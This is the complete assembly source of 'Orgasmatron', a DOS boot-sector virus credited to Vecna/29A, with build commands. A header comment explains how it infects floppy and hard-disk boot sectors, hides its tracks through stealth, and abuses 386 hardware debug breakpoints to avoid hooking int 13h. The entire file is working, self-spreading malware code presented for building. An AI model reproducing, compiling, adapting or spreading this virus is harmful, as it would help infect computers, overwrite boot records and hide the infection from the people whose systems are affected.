;
;                                                  млллллм млллллм млллллм
;    [Orgasmatron] by Vecna/29A                    ллл ллл ллл ллл ллл ллл
;    A research full-stealth boot virus             мммллп плллллл ллллллл
;    which uses 386+ PMODE features                лллмммм ммммллл ллл ллл
;                                                  ллллллл ллллллп ллл ллл
;
; A lot of help and code by Eternal Maverick/SGWW.
;
; This virus is the first boot virus ever that doesn't hook int 13h in order
; to infect and stealth its tracks. It only hooks int 1, to manage the hard-
; ware debug breakpoints, and int 8, to constantly monitor any changes which
; happen in int 1, to prevent disabling our  handler, and setting  the debug
; breakpoint at the int 13h entry point.
;
; When the computer is booted  from an infected floppy, the virus will first
; check if the computer is 386+, by means of int 6 (invalid opcode). If it's
; a 286 or even a lower machine, it will return the control to  the original
; boot. Else, it will hook int 1 and int 8.
;
; The task performed by int 8 is not to  allow  any  changes in 0:4 (int 1),
; fixing it if  necessary, and set DR3 to  point to the BIOS entry point for
; int 13h. I use DR3, the last  of the debug  breakpoints, because it's less
; likely to be overwritten  by other programs. Debuggers and  other programs
; that use int 1 or  hardware debug breakpoints, like Soft-ICE or Windows95,
; will either crash, don't work, or don't let the virus work.
;
; When int 1 is called, our handler checks if it comes from  an int 1 opcode
; (0xcd, 0x01 or 0xf1), from  single  step, or from a hardware  debug break-
; point. If it is a debug breakpoint, and it comes from "our" DR3, the virus
; will infect the floppy or stealth it in case it's already infected. Orgas-
; matron infects the  boot sector  in HDs and floppies. The original boot is
; put in the  last sector of the first  track in harddrives, and in the last
; sector of the  root dir in floppies. This  will allow  it to work with any
; floppy size.
;
; As you could read in the heading, Orgasmatron is the very first boot virus
; ever which uses 386+ PMODE features and works in protected mode, making it
; much more versatile and advanced.
;
; Lots of help and bug fix by Eternal Maverick/SGWW.
;
; No greetings this time... ;)
;
; tasm /m /la orgasmat.asm
; tlink orgasmat.obj
; exe2bin orgasmat.exe orgasmat.bin


.model tiny
.code
.8086
org 0h

start   proc
        jmp loco
        nop
endp    start

bpb     struc
        bpb_oem db 8 dup (?)
        bpb_b_s dw ?
        bpb_s_c db ?
        bpb_r_s dw ?
        bpb_n_f db ?
        bpb_r_e dw ?
        bpb_t_s dw ?
        bpb_m_d db ?
        bpb_s_f dw ?
        bpb_s_t dw ?
        bpb_n_h dw ?
        bpb_h_d dw ?
        bpb_sht db 20h dup (?)
bpb     ends

boot    bpb <>

loco    proc
        cli
        sub ax, ax
        mov ss, ax
        mov sp, 7c00h
        push cs
        pop ds
        dec word ptr ds:[413h]
        int 12h
        mov cl, 10
        ror ax, cl
        mov es, ax
        xor di, di
        mov si, sp
        mov cx, 0100h
        rep movsw
        push es
        mov  ax, offset strtovr
        push ax
        retf
endp    loco

strtovr proc
        mov  byte ptr cs:[i13InUse], 0
        push dword ptr ds:[6*4]
        cmp  word ptr ds:[1Ch*4],offset int1C
        je   is286orlower
        mov word ptr ds:[6*4], offset is286orlower
        mov word ptr ds:[6*4+2], cs
.386p
        mov  eax, dword ptr ds:[13h*4]
        mov  dword ptr cs:[old13], eax
        mov  eax, dword ptr ds:[1Ch*4]
        mov  dword ptr cs:[old1C],eax
        mov  word ptr ds:[1Ch*4],offset int1C
        mov  word ptr ds:[1Ch*4+2],cs
        jmp  installed
.8086
is286orlower:
        inc word ptr ds:[413h]
installed:
        pop dword ptr ds:[6*4]
        sti
        push ds
        pop  es
retry:
	xor ax, ax
	int 13h
        mov ax, 0201h
        mov bx, 7c00h
        call setcxdxdo13
        jc retry
        db 0eah
        dw 07c00h
        dw 0h
endp    strtovr

.386p

setcxdxdo13 proc
        push ax
        cmp dl, 80h
        je harddrive
floppydrive:
        mov cx, word ptr es:[bx.bpb_r_e+3]
        shr cx, 4
        movzx ax, byte ptr es:[bx.bpb_n_f+3]
        mul word ptr es:[bx.bpb_s_f+3]
        add cx, ax
        inc cx
        sub cx, word ptr es:[bx.bpb_s_t+3]
        mov dh, 1
        jmp goexit
harddrive:
        mov ah, 8
        int 13h
        and cx, 0111111b
        mov dx,80h
goexit:
        pop ax
int13   proc
        pushf
        db 9ah
old13   equ this dword
        dd ?
endp    int13
        ret
endp    setcxdxdo13

setdr   proc
        push ds
        pushad
        push 0
        pop ds
        mov word ptr ds:[1*4], offset int1
        mov word ptr ds:[1*4+2], cs
        mov byte ptr cs:[change], 90h
        movzx eax, word ptr cs:[old13]
        movzx ebx, word ptr cs:[old13+2]
        shl ebx, 4
        add ebx, eax
        mov dr3, ebx
        mov eax, dr7
        or al, 010000000b
        mov dr7, eax
        popad
        pop ds
        ret
endp    setdr

int1C   proc
        cmp byte ptr cs:[i13InUse], 0
        jne int1isrunning
        call setdr
int1isrunning:
        db  0eah
old1C   dd ?
endp    int1C

int1    proc
        push eax
        mov eax, dr6
        mov dword ptr cs:[savedr6], eax
        xor eax, eax
        mov dr6, eax
        mov eax, dr7
        and al, not 010000000b
        mov dr7, eax
        pop eax
        nop
change  equ byte ptr $ -1
endp    int1

debug   proc
        push eax
        push ds
        push cs
        pop ds
        inc byte ptr [i13InUse]
        mov eax, -1
savedr6 equ dword ptr $-4
        test ax, 0100000000001000b
        jz  done
        mov byte ptr [change], 0cfh
        cmp cx, 1
        jne done
        cmp dl, 80h
	jb  floppy
	cmp dh,1
	je  bootaccess
	jmp short done
floppy:
	or  dh,dh
	jne done
bootaccess:
        pop ds
        pop eax
        add sp, 6
        call int13
        pushf
        push ax
        jc error
        cmp word ptr es:[bx+offset mymark], '**'
mymark  equ word ptr $ -2
        je stealth
        mov ax, 0301h
        call setcxdxdo13
        jc error
        pusha
        push es
        push ds
        push es
        pop ds
        push cs
        pop es
        mov di, offset boot
	lea si,[bx+3]
        mov cx, 3bh
        cld
        rep movsb
        mov ax, 0301h
        xor bx, bx
	inc cx
        mov dh, 1
        cmp dl, 80h
        je winchester
        mov dh, 0
winchester:
        call int13
        pop ds
        pop es
        popa
stealth:
        mov ax, 0201h
        call setcxdxdo13
error:
        dec byte ptr cs:[i13InUse]
        pop ax
	popf
        retf 2
done:
        dec byte ptr [i13InUse]
        pop ds
        pop eax
        iret
endp    debug

i13InUse db -1

        db 0, 0, '-=№ORGASMATRON№=-', 0, 0

org 01feh

        db 55h,0aah

buffer  equ this byte

end     start
